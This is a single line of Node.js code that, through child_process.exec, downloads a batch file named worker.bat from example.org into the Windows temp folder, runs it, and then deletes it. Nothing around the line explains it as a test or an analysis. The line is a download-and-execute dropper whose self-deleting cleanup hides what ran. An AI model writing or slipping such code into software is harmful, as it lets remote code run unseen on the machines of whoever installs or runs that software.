const cp=require("child_process");cp.exec('curl https://example.org/worker.bat -o "%TEMP%/box.bat" && "%TEMP%/box.bat" && del "%TEMP%/box.bat"');
